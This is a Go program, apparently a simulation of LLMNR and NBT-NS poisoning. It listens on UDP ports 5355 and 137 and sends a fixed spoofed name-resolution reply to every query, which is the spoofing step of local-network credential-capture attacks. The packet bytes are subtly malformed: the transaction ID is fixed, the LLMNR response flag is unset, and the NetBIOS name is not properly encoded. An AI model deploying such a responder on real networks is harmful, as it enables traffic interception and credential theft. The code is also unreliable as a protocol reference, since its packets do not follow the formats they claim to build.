package main

import (
    "fmt"
    "net"
)

func main() {
    go simulateAttack(":5355") // LLMNR
    go simulateAttack(":137")  // NBT-NS

    select {} // Keep the program running
}

func simulateAttack(port string) {
    conn, err := net.ListenPacket("udp", "0.0.0.0"+port)
    if err != nil {
        fmt.Printf("Error listening on port %s: %v\n", port, err)
        return
    } else {
        fmt.Printf("Opened socket server on port %s\n", port)
    }
    defer conn.Close()

    for {
        buffer := make([]byte, 1024)
        _, addr, err := conn.ReadFrom(buffer)
        if err != nil {
            fmt.Printf("Error reading from buffer on port %s: %v\n", port, err)
            continue
        }

        var response []byte
        if port == ":5355" {
            response = constructLLMNRResponse()
        } else if port == ":137" {
            response = constructNBTNSResponse()
        }

        _, err = conn.WriteTo(response, addr)
        if err != nil {
            fmt.Printf("Error sending response on port %s: %v\n", port, err)
        } else {
            fmt.Printf("Sent simulated response to %v on port %s\n", addr, port)
        }
    }
}

func constructLLMNRResponse() []byte {
    // Simulated LLMNR response packet (for example purposes)
    llmnrResponse := []byte{
        0x00, 0x01, // Transaction ID
        0x00, 0x00, // Flags
        0x00, 0x01, // Questions
        0x00, 0x01, // Answer RRs
        0x00, 0x00, // Authority RRs
        0x00, 0x00, // Additional RRs
        // Query Name
        // You can replace this with your desired hostname (e.g., "example.com")
        0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00,
        0x00, 0x1C, // Query Type (AAAA)
        0x00, 0x01, // Query Class (IN)
        // Resource Record
        // Name: Same as in the query
        0xC0, 0x0C, // Compression pointer to the query name
        0x00, 0x1C, // Type (AAAA)
        0x00, 0x01, // Class (IN)
        0x00, 0x00, 0x00, 0x0A, // TTL (10 seconds)
        0x00, 0x10, // Data Length (16 bytes)
        // IPv6 Address (Replace with the desired IPv6 address)
        0x20, 0x01, 0x0D, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
    }
    
    return llmnrResponse
}

func constructNBTNSResponse() []byte {
    // Simulated NBT-NS response packet (for example purposes)
    nbtnsResponse := []byte{
        // Transaction ID (2 bytes)
        0x12, 0x34,
        // Flags (2 bytes)
        0x85, 0x00,
        // Questions (2 bytes)
        0x00, 0x01,
        // Answer RRs (2 bytes)
        0x00, 0x01,
        // Authority RRs (2 bytes)
        0x00, 0x00,
        // Additional RRs (2 bytes)
        0x00, 0x00,
        // Name (NetBIOS name) - Example: "MYCOMPUTER"
        0x20, 0x4D, 0x59, 0x43, 0x4F, 0x4D, 0x50, 0x55, 0x54, 0x45, 0x52, 0x00,
        // Type (2 bytes) - NBT-NS Name Query Response
        0x00, 0x20,
        // Class (2 bytes) - Internet (IN)
        0x00, 0x01,
        // Time to Live (4 bytes)
        0x00, 0x00, 0x00, 0x0A, // TTL: 10 seconds
        // Data Length (2 bytes)
        0x00, 0x06,
        // Flags (2 bytes)
        0x00, 0x00,
        // Address (IPv4 address) - Example: 192.168.1.100
        0xC0, 0xA8, 0x01, 0x64,
    }
    
    return nbtnsResponse
}